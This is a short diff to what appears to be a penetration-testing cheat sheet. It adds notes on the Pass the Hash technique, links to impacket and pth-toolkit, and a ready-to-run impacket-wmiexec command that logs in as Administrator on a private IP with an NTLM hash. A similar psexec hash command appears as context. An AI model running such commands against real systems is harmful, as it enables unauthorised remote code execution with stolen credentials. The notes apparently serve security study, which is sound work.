@@ -474,7 +474,12 @@ impacket-psexec -hashes 00000000000000000000000000000000:e460605a9dbd55097c6cf77
 ```
 
 ## Pass the Hash
-
+- this will not work for Kerberos authentication but only for servers or services using NTLM authentication.
+- https://github.com/byt3bl33d3r/pth-toolkit
+- https://github.com/fortra/impacket/blob/master/examples/smbclient.py
+```
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
 ## Overpass the Hash
 
 ## Pass the Ticket
